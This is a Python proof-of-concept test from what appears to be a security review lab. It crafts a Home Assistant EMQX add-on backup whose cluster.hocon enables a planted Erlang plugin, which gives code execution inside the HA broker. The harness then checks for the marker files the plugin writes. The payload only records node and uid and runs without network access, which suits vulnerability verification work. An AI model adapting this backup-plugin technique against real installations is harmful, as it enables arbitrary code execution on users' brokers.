"""T2 / B1-06: a crafted HA backup's cluster.hocon enables an Erlang plugin staged under data/emqx/data/certs/ ->
code execution inside the product's HA broker (`ha_broker`). Run: python3 -I t2_plugin_exec.py <base|prodint|fixed>
Only lab storage, --network none, throwaway objects; the plugin only writes marker files inside its own volumes."""
import io
import json
import os
import sys
import tarfile
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import secrev_lab as L

EVIL_ERL = rb'''-module(secrev_evil_app).
-behaviour(application).
-export([start/2, stop/1]).
start(_T, _A) ->
    M = io_lib:format("SECREV-PLUGIN-RAN node=~p uid=~s~n", [node(), string:trim(os:cmd("id -u"))]),
    [file:write_file(F, M) || F <- ["/work/out/secrev-marker.txt", "/opt/emqx/log/secrev-marker.txt",
                                     "/data/emqx/data/secrev-marker.txt"]],
    {ok, spawn_link(fun() -> receive never -> ok end end)}.
stop(_) -> ok.
'''
APP = (b'{application, secrev_evil, [{description, "secrev"}, {vsn, "1.0.0"}, {modules, [secrev_evil_app]},'
       b' {registered, []}, {applications, [kernel, stdlib]}, {mod, {secrev_evil_app, []}}]}.\n')
RELEASE = json.dumps({'name': 'secrev_evil', 'rel_vsn': '1.0.0', 'rel_apps': ['secrev_evil-1.0.0'],
                      'description': 'secrev test plugin'}).encode()
HOCON = b'''plugins {
  install_dir = "/data/emqx/data/certs/secrev"
  states = [ { name_vsn = "secrev_evil-1.0.0", enable = true } ]
}
'''


def compile_beam():
    vol = 'woowbk-secrev-t2-build'
    L.lab('volume', 'rm', '-f', vol, check=False)
    L.lab('volume', 'create', '--label', L.LABEL, vol)
    L.lab('volume', 'import', vol, '-', input=L.tar_bytes({'secrev_evil_app.erl': EVIL_ERL}, uid=1000, gid=1000))
    script = ('B=$(ls -d /opt/emqx/erts-*)/bin; cd /src && ROOTDIR=/opt/emqx BINDIR=$B EMU=beam PROGNAME=erl '
              '$B/erlexec -boot /opt/emqx/releases/5.8.9/start_clean -noshell -eval '
              '\'{ok,_}=compile:file("secrev_evil_app.erl",[{outdir,"/src"}]),halt().\'')
    L.lab('run', '--rm', '--network', 'none', '--pull=never', '--label', L.LABEL, '-v', f'{vol}:/src',
          '--entrypoint', '/bin/sh', L.IMAGE, '-c', script, timeout=300)
    exported = L.lab('volume', 'export', vol).stdout
    L.lab('volume', 'rm', '-f', vol, check=False)
    with tarfile.open(fileobj=io.BytesIO(exported)) as tar:
        return tar.extractfile([m for m in tar.getmembers() if m.name.endswith('secrev_evil_app.beam')][0]).read()


def addon_tar(beam, *, slug='woow-emqx'):
    base = 'data/emqx/data/'
    files = {
        'addon.json': json.dumps({'system': {'slug': slug, 'name': 'EMQX'}, 'version': '5.9.1',
                                  'user': {'image': 'ghcr.io/woowtech/woow-ha-emqx-amd64'}, 'state': 'stopped'}).encode(),
        'data/emqx/node.name': b'emqx@127.0.0.1\n',
        base + 'mnesia/emqx@127.0.0.1': None,
        base + 'configs/cluster.hocon': HOCON,
        base + 'certs/secrev/secrev_evil-1.0.0/release.json': RELEASE,
        base + 'certs/secrev/secrev_evil-1.0.0/secrev_evil-1.0.0/ebin/secrev_evil_app.beam': beam,
        base + 'certs/secrev/secrev_evil-1.0.0/secrev_evil-1.0.0/ebin/secrev_evil.app': APP,
    }
    return L.tar_bytes(files)


def main(codebase):
    ha_emqx = L.use(codebase)
    started = time.time()
    result = {'test': 'T2 plugin code execution in the HA broker (B1-06)', 'codebase': codebase,
              'image': L.IMAGE, 'network': 'none', 'store': 'labpodman (separate --root)'}
    beam = compile_beam()
    inner = addon_tar(beam)
    runner = L.make_runner()
    work = L.FakeWork(runner)
    work.addon_member = lambda slug: slug
    work.open = lambda member: io.BytesIO(inner)
    staging = tempfile.mkdtemp(prefix='t2-', dir=os.path.join(L.SR, 'runs'))
    with L.temp(runner) as tmp:
        src = ha_emqx.member_pass(work, tmp)
        node, blocker = ha_emqx.node_name(src)
        result['node'], result['node_blocker'] = node, blocker
        target = L.SimpleNamespace(image=L.IMAGE)
        try:
            readings = ha_emqx.ha_broker(work, tmp, target, src, node, out_dir=staging)
            result['ha_broker'] = 'started+exported' if readings.get('export') else 'started'
        except L.BackupError as error:
            result['ha_broker'] = 'refused: ' + error.message
        if tmp.running('emqx-ha'):
            marker = tmp.exec('emqx-ha', ['cat', '/data/emqx/data/secrev-marker.txt'], timeout=60, check=False)
            result['marker_in_src_volume'] = marker.stdout.decode(errors='replace').strip() if marker.returncode == 0 else None
            marker = tmp.exec('emqx-ha', ['cat', '/work/out/secrev-marker.txt'], timeout=60, check=False)
            result['marker_in_work_volume'] = marker.stdout.decode(errors='replace').strip() if marker.returncode == 0 else None
            plugins = tmp.exec('emqx-ha', ['emqx', 'ctl', 'plugins', 'list'], timeout=60, check=False)
            result['plugins_list_has_secrev'] = b'secrev_evil' in (plugins.stdout or b'')
            result['plugin_running'] = b'"running_status"' in (plugins.stdout or b'') and b'running' in (plugins.stdout or b'')
    result['code_executed'] = bool(result.get('marker_in_src_volume'))
    result['elapsed_s'] = round(time.time() - started, 1)
    print(json.dumps(result, ensure_ascii=False, indent=1))
    L.evidence(os.path.join(L.SR, 'runs', f't2-{codebase}.json'), result)


if __name__ == '__main__':
    main(sys.argv[1])
